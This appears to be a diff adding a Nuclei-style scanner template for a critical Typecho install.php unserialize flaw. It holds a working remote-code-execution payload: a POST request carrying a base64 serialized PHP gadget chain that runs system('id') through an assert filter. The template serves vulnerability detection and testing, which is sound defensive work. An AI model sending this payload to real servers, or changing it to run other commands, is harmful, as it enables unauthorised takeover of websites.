@@ -1,0 +1,34 @@
+id: typecho-install-php-unserialize-rce
+info:
+  name: Typecho install.php unserialize RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Typecho is a lightweight blog program. The install.php script invokes the unserialize function to process user-supplied data, leading to arbitrary code execution.
+  reference:
+    - https://github.com/typecho/typecho/issues/619
+    - https://yoga7xm.top/2019/06/01/typecho/
+  classification:
+    cvss-score: 9.3
+  metadata:
+    product: Typecho < 1.1(17.10.24)
+    impact: Arbitrary code execution
+
+variables:
+  phpCode: "system('id');"
+
+http:
+  - raw:
+      - |
+        POST /install.php?finish HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{BaseURL}}
+        Content-Type: application/x-www-form-urlencoded
+
+        __typecho_config={{base64(concat('a:2:{s:7:\"adapter\";O:12:\"Typecho_Feed\":2:{s:19:\"\\x00Typecho_Feed\\x00_type\";s:8:\"ATOM 1.0\";s:20:\"\\x00Typecho_Feed\\x00_items\";a:1:{i:0;a:2:{s:8:\"category\";a:1:{i:0;O:15:\"Typecho_Request\":2:{s:24:\"\\x00Typecho_Request\\x00_params\";a:1:{s:10:\"screenName\";s:', len(phpCode), ':\"', phpCode, '\";}s:24:\"\\x00Typecho_Request\\x00_filter\";a:1:{i:0;s:6:\"assert\";}}}s:6:\"author\";O:15:\"Typecho_Request\":2:{s:24:\"\\x00Typecho_Request\\x00_params\";a:1:{s:10:\"screenName\";s:', len(phpCode), ':\"', phpCode, '\";}s:24:\"\\x00Typecho_Request\\x00_filter\";a:1:{i:0;s:6:\"assert\";}}}}s:6:\"prefix\";s:8:\"typecho_\";}}'))}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "typecho-install"
